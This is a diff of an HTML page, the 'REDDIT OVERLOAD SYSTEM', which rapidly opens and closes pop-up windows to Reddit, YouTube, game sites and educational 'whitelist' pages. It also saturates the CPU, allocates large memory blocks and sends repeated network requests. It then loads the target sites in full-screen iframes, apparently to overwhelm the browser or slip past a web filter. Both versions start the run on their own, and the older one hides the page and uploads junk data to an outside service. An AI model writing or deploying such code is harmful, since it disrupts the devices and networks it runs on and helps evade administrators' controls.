@@ -1,227 +1,492 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Resource Loader</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            text-align: center;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        h1 {
+            color: #ff4500;
+            margin-bottom: 30px;
+        }
+        
+        .status-box {
+            background: #222;
+            border: 2px solid #ff4500;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .stat {
+            background: #333;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #ff4500;
+            margin-bottom: 5px;
+        }
+        
+        .progress-container {
+            margin: 25px 0;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 30px;
+            background: #333;
+            border-radius: 15px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff4500, #ff8500);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .button {
+            background: #ff4500;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            border-radius: 25px;
+            cursor: pointer;
+            margin: 10px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .button:hover {
+            background: #ff5500;
+            transform: scale(1.05);
+        }
+        
+        .button.stop {
+            background: #ff0000;
+        }
+        
+        .log {
+            background: #111;
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            height: 200px;
+            overflow-y: auto;
+            text-align: left;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        
+        .log-entry {
+            color: #0f0;
+            margin-bottom: 5px;
+            padding: 3px 0;
+            border-bottom: 1px solid #222;
+        }
+        
+        .warning {
+            color: #ff0;
+            background: rgba(255, 255, 0, 0.1);
+            border: 1px solid #ff0;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        
+        .control-panel {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+        
+        .slider-container {
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        input[type="range"] {
+            width: 100%;
+            margin: 10px 0;
+        }
+        
+        .target-button {
+            background: #00cc00;
+        }
+        
+        .cpu-meter {
+            width: 100%;
+            height: 10px;
+            background: #333;
+            border-radius: 5px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        
+        .cpu-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000);
+            width: 0%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 REDDIT OVERLOAD SYSTEM</h1>
+        
+        <div class="status-box">
+            <h2 id="statusText">Ready to start</h2>
+            <div class="cpu-meter">
+                <div class="cpu-fill" id="cpuFill"></div>
+            </div>
+        </div>
+        
+        <div class="progress-container">
+            <h3>Overload Progress</h3>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <p id="progressText">0% - Waiting</p>
+        </div>
+        
+        <div class="control-panel">
+            <button class="button" id="startBtn">🚀 START SPAM</button>
+            <button class="button stop" id="stopBtn" disabled>⏹️ STOP</button>
+            <button class="button target-button" id="targetBtn">🎯 LOAD REDDIT</button>
+        </div>
+        
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value" id="tabsOpened">0</div>
+                <div>Tabs Opened</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="tabsClosed">0</div>
+                <div>Tabs Closed</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="activeTabs">0</div>
+                <div>Active Now</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="requests">0</div>
+                <div>Requests</div>
+            </div>
+        </div>
+        
+        <div class="slider-container">
+            <label>SPEED: <span id="speedValue">50</span> tabs/sec</label>
+            <input type="range" id="speedSlider" min="10" max="200" value="50">
+        </div>
+        
+        <div class="warning">
+            ⚠️ Warning: This will open/close hundreds of tabs rapidly. May cause browser lag.
+        </div>
+        
+        <div class="log" id="logBox">
+            <div class="log-entry">System ready. Press START to begin.</div>
+        </div>
+    </div>
+
     <script>
-        // CONFIGURATION
-        const config = {
-            tabsPerSecond: 100,        // How many tabs to open per second
-            maxTabs: 500,              // Maximum tabs to have open at once
-            closeDelay: 50,           // Close tabs after this many ms (lower = faster spam)
-            memoryLoad: true,         // Create memory pressure
-            cpuLoad: true,            // Create CPU load
-            networkSpam: true,        // Spam network requests
-            autoStart: true,          // Start automatically
-            runTime: 30000            // Run for 30 seconds then load target
+        // ============ CONFIG ============
+        const CONFIG = {
+            speed: 50,           // Tabs per second
+            maxActive: 100,      // Maximum tabs open at once
+            closeDelay: 80,      // Close tabs after this many ms
+            runTime: 45000,      // Run for 45 seconds
+            memoryLoad: true,    // Create memory pressure
+            cpuLoad: true        // Create CPU load
         };
 
-        // SITE LISTS
-        const whitelist = [
+        // ============ REDDIT URLS ============
+        const REDDIT_URLS = [
+            'https://www.reddit.com',
+            'https://old.reddit.com',
+            'https://www.reddit.com/r/all',
+            'https://www.reddit.com/r/funny',
+            'https://www.reddit.com/r/gaming',
+            'https://www.reddit.com/r/videos',
+            'https://www.reddit.com/r/pics',
+            'https://www.reddit.com/r/aww',
+            'https://www.reddit.com/r/memes',
+            'https://www.reddit.com/r/technology',
+            'https://www.reddit.com/r/science',
+            'https://www.reddit.com/r/worldnews',
+            'https://www.reddit.com/r/AskReddit',
+            'https://www.reddit.com/r/Music',
+            'https://www.reddit.com/r/movies'
+        ];
+
+        // ============ WHITELIST SITES ============
+        const WHITELIST = [
             'https://www.wikipedia.org',
             'https://www.khanacademy.org',
             'https://www.nasa.gov',
             'https://www.nationalgeographic.com',
             'https://www.britannica.com',
-            'https://www.history.com'
+            'https://www.history.com',
+            'https://www.mathsisfun.com',
+            'https://www.ducksters.com',
+            'https://www.factmonster.com',
+            'https://www.ck12.org'
         ];
 
-        const targets = [
-            'https://www.reddit.com'
-            'https://www.coolmathgames.com',
-            'https://www.poki.com',
-            'https://www.youtube.com',
-            'https://www.twitch.tv',
-            'https://www.netflix.com'
-        ];
-
-        // STATE
-        let activeWindows = [];
-        let totalOpened = 0;
-        let totalClosed = 0;
+        // ============ STATE ============
         let isRunning = false;
+        let activeWindows = [];
+        let stats = {
+            opened: 0,
+            closed: 0,
+            requests: 0
+        };
         let startTime = 0;
+        let intervalId = null;
+        let cpuUsage = 0;
 
-        // OPEN EXTERNAL TAB
-        function openRandomTab() {
-            try {
-                // Randomly choose URL
-                const sites = [...whitelist, ...targets];
-                const url = sites[Math.floor(Math.random() * sites.length)];
-                
-                // Generate random window ID
-                const winId = 'spam_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                
-                // Open window with minimal features (faster)
-                const newWin = window.open(url, winId, 'width=100,height=100,left=' + Math.random() * screen.width + ',top=' + Math.random() * screen.height);
-                
-                if (newWin) {
-                    activeWindows.push({
-                        window: newWin,
-                        id: winId,
-                        openedAt: Date.now()
-                    });
-                    totalOpened++;
+        // ============ DOM ELEMENTS ============
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const targetBtn = document.getElementById('targetBtn');
+        const logBox = document.getElementById('logBox');
+        const speedSlider = document.getElementById('speedSlider');
+        const speedValue = document.getElementById('speedValue');
+
+        // ============ UTILITIES ============
+        function log(message) {
+            const now = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.textContent = `[${now}] ${message}`;
+            logBox.prepend(entry);
+            if (logBox.children.length > 20) {
+                logBox.removeChild(logBox.lastChild);
+            }
+        }
+
+        function updateStats() {
+            document.getElementById('tabsOpened').textContent = stats.opened;
+            document.getElementById('tabsClosed').textContent = stats.closed;
+            document.getElementById('activeTabs').textContent = activeWindows.length;
+            document.getElementById('requests').textContent = stats.requests;
+            
+            // Update progress
+            if (isRunning) {
+                const elapsed = Date.now() - startTime;
+                const progress = Math.min((elapsed / CONFIG.runTime) * 100, 100);
+                document.getElementById('progressFill').style.width = progress + '%';
+                document.getElementById('progressText').textContent = 
+                    Math.round(progress) + '% - Overload in progress...';
+            }
+            
+            // Update CPU meter
+            cpuUsage = Math.min(activeWindows.length * 2 + cpuUsage, 100);
+            document.getElementById('cpuFill').style.width = cpuUsage + '%';
+            
+            // Update status text
+            if (isRunning) {
+                const level = activeWindows.length > 50 ? 'HIGH' : 
+                             activeWindows.length > 20 ? 'MEDIUM' : 'LOW';
+                document.getElementById('statusText').textContent = 
+                    `OVERLOAD ACTIVE (${level}) - ${activeWindows.length} tabs open`;
+            }
+        }
+
+        // ============ TAB SPAMMING ============
+        function spamTabs() {
+            if (!isRunning) return;
+            
+            const tabsToOpen = Math.floor(CONFIG.speed / 10);
+            
+            for (let i = 0; i < tabsToOpen; i++) {
+                setTimeout(() => {
+                    if (!isRunning) return;
                     
-                    // Schedule closing
-                    setTimeout(() => {
-                        try {
-                            if (newWin && !newWin.closed) {
-                                newWin.close();
-                                totalClosed++;
-                                // Remove from active list
-                                const index = activeWindows.findIndex(w => w.id === winId);
-                                if (index > -1) {
-                                    activeWindows.splice(index, 1);
-                                }
+                    // 70% Reddit, 30% whitelist
+                    const useReddit = Math.random() < 0.7;
+                    const urls = useReddit ? REDDIT_URLS : WHITELIST;
+                    const url = urls[Math.floor(Math.random() * urls.length)];
+                    
+                    try {
+                        // Generate random window position
+                        const left = Math.floor(Math.random() * (screen.width - 300));
+                        const top = Math.floor(Math.random() * (screen.height - 200));
+                        
+                        // Open window
+                        const win = window.open(
+                            url,
+                            'spam_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                            `width=300,height=200,left=${left},top=${top},menubar=yes,toolbar=yes`
+                        );
+                        
+                        if (win) {
+                            const winId = Date.now();
+                            activeWindows.push({ window: win, id: winId });
+                            stats.opened++;
+                            stats.requests++;
+                            
+                            if (useReddit) {
+                                log(`OPEN REDDIT: ${new URL(url).hostname + new URL(url).pathname}`);
+                            } else {
+                                log(`OPEN: ${new URL(url).hostname}`);
                             }
-                        } catch(e) {}
-                    }, config.closeDelay + Math.random() * 50);
+                            
+                            // Schedule closing
+                            setTimeout(() => {
+                                try {
+                                    if (win && !win.closed) {
+                                        win.close();
+                                        stats.closed++;
+                                        activeWindows = activeWindows.filter(w => w.id !== winId);
+                                    }
+                                } catch(e) {}
+                            }, CONFIG.closeDelay + Math.random() * 50);
+                        }
+                    } catch(e) {
+                        log(`ERROR: ${e.message}`);
+                    }
+                }, i * 10);
+            }
+            
+            // Clean up if too many
+            if (activeWindows.length > CONFIG.maxActive) {
+                const toClose = activeWindows.slice(0, activeWindows.length - CONFIG.maxActive);
+                toClose.forEach(w => {
+                    try { w.window.close(); } catch(e) {}
+                });
+                activeWindows = activeWindows.slice(-CONFIG.maxActive);
+            }
+        }
+
+        // ============ MEMORY OVERLOAD ============
+        function createMemoryLoad() {
+            if (!CONFIG.memoryLoad) return;
+            
+            try {
+                const bigArray = [];
+                for (let i = 0; i < 50000; i++) {
+                    bigArray.push({
+                        id: i,
+                        data: 'x'.repeat(500),
+                        timestamp: Date.now(),
+                        random: Math.random() * Math.random() * Math.random()
+                    });
                 }
+                
+                if (!window.memoryBlocks) window.memoryBlocks = [];
+                window.memoryBlocks.push(bigArray);
+                
+                if (window.memoryBlocks.length > 15) {
+                    window.memoryBlocks.shift();
+                }
+                
+                stats.requests++;
             } catch(e) {}
         }
 
-        // MEMORY OVERLOAD
-        function createMemoryLoad() {
-            if (!config.memoryLoad) return;
-            
-            // Create massive array
-            const bigArray = [];
-            for (let i = 0; i < 100000; i++) {
-                bigArray.push({
-                    id: i,
-                    data: new Array(1000).fill('x').join(''),
-                    timestamp: Date.now(),
-                    random: Math.random()
-                });
-            }
-            
-            // Keep reference
-            if (!window.memoryBlocks) window.memoryBlocks = [];
-            window.memoryBlocks.push(bigArray);
-            
-            // Clean old blocks
-            if (window.memoryBlocks.length > 20) {
-                window.memoryBlocks.shift();
-            }
-        }
-
-        // CPU OVERLOAD
+        // ============ CPU OVERLOAD ============
         function createCPULoad() {
-            if (!config.cpuLoad) return;
+            if (!CONFIG.cpuLoad || !isRunning) return;
             
             // Heavy computation
             let result = 0;
-            const iterations = 1000000;
-            for (let i = 0; i < iterations; i++) {
+            for (let i = 0; i < 500000; i++) {
                 result += Math.sqrt(Math.sin(Math.random()) * Math.cos(Math.random()));
             }
             
-            // Recursive for continuous load
-            if (isRunning) {
-                setTimeout(createCPULoad, 0);
-            }
-        }
-
-        // NETWORK SPAM
-        function spamNetwork() {
-            if (!config.networkSpam) return;
+            cpuUsage = Math.min(cpuUsage + 5, 100);
             
-            // Make fetch requests to random URLs
-            for (let i = 0; i < 5; i++) {
-                const url = whitelist[Math.floor(Math.random() * whitelist.length)];
+            // Recursive
+            setTimeout(createCPULoad, 0);
+        }
+
+        // ============ NETWORK SPAM ============
+        function spamNetwork() {
+            // Make fetch requests
+            for (let i = 0; i < 3; i++) {
+                const url = WHITELIST[Math.floor(Math.random() * WHITELIST.length)];
                 fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(() => {});
-                
-                // Also try to load images
-                const img = new Image();
-                img.src = url + '?cache=' + Date.now();
+                stats.requests++;
             }
         }
 
-        // UPLOAD SPAM (fake uploads)
-        function spamUploads() {
-            // Create fake file uploads
-            const fakeFiles = [];
-            for (let i = 0; i < 10; i++) {
-                // Create large blob
-                const size = 1024 * 1024 * 5; // 5MB
-                const data = new Uint8Array(size);
-                for (let j = 0; j < size; j++) {
-                    data[j] = Math.floor(Math.random() * 256);
-                }
-                const blob = new Blob([data], { type: 'application/octet-stream' });
-                fakeFiles.push(blob);
-                
-                // Try to "upload" via FormData
-                const formData = new FormData();
-                formData.append('file', blob, 'spam_' + i + '.bin');
-                
-                // Fake fetch to nowhere
-                fetch('https://httpbin.org/post', {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                }).catch(() => {});
-            }
-        }
-
-        // MAIN SPAM FUNCTION
-        function startSpam() {
+        // ============ CONTROL FUNCTIONS ============
+        function startAttack() {
             if (isRunning) return;
             
+            log("🚀 STARTING REDDIT OVERLOAD ATTACK");
             isRunning = true;
             startTime = Date.now();
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
             
-            // Start CPU load
-            if (config.cpuLoad) {
-                createCPULoad();
-            }
+            document.getElementById('statusText').textContent = "OVERLOAD ACTIVE";
+            document.getElementById('progressText').textContent = "0% - Starting...";
             
-            // Main spam interval
-            const spamInterval = setInterval(() => {
-                if (!isRunning) {
-                    clearInterval(spamInterval);
-                    return;
-                }
-                
-                // Open multiple tabs
-                for (let i = 0; i < config.tabsPerSecond / 10; i++) {
-                    setTimeout(openRandomTab, i * 10);
-                }
-                
-                // Memory load every 2 seconds
-                if (Date.now() % 2000 < 100) {
-                    createMemoryLoad();
-                }
-                
-                // Network spam every second
-                if (Date.now() % 1000 < 100) {
-                    spamNetwork();
-                }
-                
-                // Upload spam every 5 seconds
-                if (Date.now() % 5000 < 100) {
-                    spamUploads();
-                }
-                
-                // Clean up if too many windows
-                if (activeWindows.length > config.maxTabs) {
-                    activeWindows.slice(0, activeWindows.length - config.maxTabs).forEach(w => {
-                        try { w.window.close(); } catch(e) {}
-                    });
-                    activeWindows = activeWindows.slice(-config.maxTabs);
-                }
+            // Clear existing windows
+            activeWindows.forEach(w => {
+                try { w.window.close(); } catch(e) {}
+            });
+            activeWindows = [];
+            
+            // Start intervals
+            intervalId = setInterval(() => {
+                spamTabs();
+                spamNetwork();
+                if (Date.now() % 2000 < 100) createMemoryLoad();
+                updateStats();
                 
                 // Auto-stop after runtime
-                if (Date.now() - startTime > config.runTime) {
-                    stopSpam();
-                    loadTarget();
+                if (Date.now() - startTime > CONFIG.runTime) {
+                    stopAttack();
+                    loadReddit();
                 }
-                
-            }, 100); // Run every 100ms
+            }, 100);
+            
+            // Start CPU load
+            if (CONFIG.cpuLoad) createCPULoad();
         }
 
-        function stopSpam() {
+        function stopAttack() {
+            log("⏹️ STOPPING ATTACK");
             isRunning = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
             
             // Close all windows
             activeWindows.forEach(w => {
@@ -231,16 +496,22 @@
             
             // Clear memory
             window.memoryBlocks = [];
+            
+            document.getElementById('statusText').textContent = "STOPPED";
+            document.getElementById('progressText').textContent = "0% - Stopped";
+            updateStats();
         }
 
-        function loadTarget() {
-            // Try all targets
-            targets.forEach((url, index) => {
+        function loadReddit() {
+            log("🎯 LOADING REDDIT...");
+            
+            // Try multiple Reddit URLs
+            REDDIT_URLS.forEach((url, index) => {
                 setTimeout(() => {
-                    // Multiple attempts
-                    window.open(url, '_target' + index);
-                    window.open(url, '_target2_' + index);
-                    window.open(url, '_target3_' + index);
+                    // Multiple attempts per URL
+                    window.open(url, '_reddit_' + index);
+                    window.open(url, '_reddit2_' + index);
+                    window.open(url, '_reddit3_' + index);
                     
                     // Also try iframe
                     const iframe = document.createElement('iframe');
@@ -248,42 +519,53 @@
                     iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;';
                     document.body.appendChild(iframe);
                     
-                }, index * 100);
+                }, index * 150);
             });
+            
+            document.getElementById('statusText').textContent = "LOADING REDDIT...";
         }
 
-        // KEYBOARD CONTROL
+        // ============ EVENT LISTENERS ============
+        startBtn.addEventListener('click', startAttack);
+        stopBtn.addEventListener('click', stopAttack);
+        targetBtn.addEventListener('click', loadReddit);
+
+        speedSlider.addEventListener('input', function() {
+            CONFIG.speed = parseInt(this.value);
+            speedValue.textContent = CONFIG.speed;
+            log(`Speed changed to ${CONFIG.speed} tabs/sec`);
+        });
+
+        // ============ KEYBOARD SHORTCUTS ============
         document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey && e.shiftKey && e.key === 'S') {
-                if (isRunning) stopSpam();
-                else startSpam();
+            if (e.ctrlKey && e.key === ' ') {
+                e.preventDefault();
+                if (isRunning) stopAttack();
+                else startAttack();
             }
             
-            if (e.ctrlKey && e.shiftKey && e.key === 'T') {
-                loadTarget();
+            if (e.ctrlKey && e.key === 'r') {
+                e.preventDefault();
+                loadReddit();
             }
             
             if (e.key === 'Escape') {
-                stopSpam();
+                stopAttack();
             }
         });
 
-        // START AUTOMATICALLY
-        if (config.autoStart) {
-            setTimeout(startSpam, 1000);
-        }
+        // ============ INITIALIZATION ============
+        log("System ready. Press Ctrl+Space to start/stop.");
+        log("Ctrl+R to load Reddit directly.");
+        
+        // Auto-start after 2 seconds
+        setTimeout(() => {
+            log("Auto-starting in 3... 2... 1...");
+            startAttack();
+        }, 2000);
 
-        // HIDE EVERYTHING - RUN IN BACKGROUND
-        document.body.style.display = 'none';
-        
-        // But keep script running
-        console.log('Tab spammer running in background...');
-        console.log('Press Ctrl+Shift+S to start/stop');
-        console.log('Press Ctrl+Shift+T to load target');
-        
+        // Update stats every 500ms
+        setInterval(updateStats, 500);
     </script>
-</head>
-<body>
-    <!-- EMPTY - Runs in background -->
 </body>
 </html>
